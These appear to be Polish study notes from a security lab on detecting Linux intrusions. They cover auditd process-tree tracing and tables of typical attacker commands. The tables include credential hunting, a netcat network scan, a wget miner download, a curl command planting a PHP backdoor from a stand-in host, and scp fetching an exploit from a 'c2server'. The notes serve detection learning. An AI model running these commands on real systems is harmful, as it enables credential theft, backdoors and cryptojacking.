
### Process Tree

Drzewo procesów można wyświetlić za pomocą auditd `ausearch`, wystarczy mając złośliwy proces/polecenie prześledzić parentID, grantparentID i tak dalej aż PID nie będzie 1. Przykład:

```shell-session
ubuntu@thm-vm:~$ ausearch -i -x whoami # -x filters the results by the command name
type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : syscall=execve success=yes exit=0 items=2 ppid=3905 pid=3907 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/whoami key=exec

ubuntu@thm-vm:~$ ausearch -i --pid 3905 # 3905 is a parent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
type=SYSCALL msg=audit(08/25/25 16:28:17.101:983) : syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3905 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/dash key=exec

ubuntu@thm-vm:~$ ausearch -i --pid 3898 # 3898 is a grandparent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/python3 /opt/mywebapp/app.py
type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : syscall=execve success=yes exit=0 items=2 ppid=1 pid=3898 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/python3.12 key=exec
```


### Discovery

Najczęstsze polecenia podczas fazy discovery ataku na system:

|Discovery Goal|Typical Commands|
|---|---|
|OS and Filesystem Discovery|`pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a`, `hostname`|
|User and Groups Discovery|`id`, `whoami`, `w`, `last`, `cat /etc/sudoers`, `cat /etc/passwd`|
|Process and Network Discovery|`ps aux`, `top`, `ip a`, `ip r`, `arp -a`, `ss -tnlp`, `netstat -tnlp`|
|Cloud or Sandbox Discovery|`systemd-detect-virt`, `lsmod`, `uptime`, `pgrep "<edr-or-sandbox>"`|
Kolejnym krokiem w ataku jest z reguły bardziej szczegółowe odkrywanie:

|Attack Objectives|Typical Commands|
|---|---|
|Find and steal credentials and other sensitive data|`history \| grep pass`, `find / -name .env`, `find /home -name id_rsa`|
|Identify how suitable the system is for crypto mining|`cat /proc/cpuinfo`, `lscpu \| grep Model`, `free -m`, `top`, `htop`|
|Scan the internal network for other future victims|`ping <ip>`, `for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done`|

![](Attatchments/Pasted%20image%2020251126134451.png)

### Transfer plików na zaatakowany system

Po fazie odkrycia często hackerzy wgrywają kolejne narzędzia np. do kopania krypto, dodania urządzenia do botnetu czy żeby wykorzystać jako proxy.

|Command|Usage Example|
|---|---|
|**Wget**: Download a file from the website|`wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz`|
|**Curl**: Make a request to the webpage|`curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"`|
|**SSH**: Transfer a file via [SCP or SFTP](https://www.redhat.com/en/blog/secure-file-transfer-scp-sftp)|`scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh`|
Jak atakujący połączy się po SCP albo SFTP to nie będzie widać logów w auditd, jedynie logowanie ssh.

Detekcja może być też przez sprawdzenie ruchu sieciowego - github, dziwne domeny, virustotal, tworzenie plików w /tmp albo /var/tmp, stworzone pliki o nazwach jak exploit, shell.php czy jakieś losowe znaki.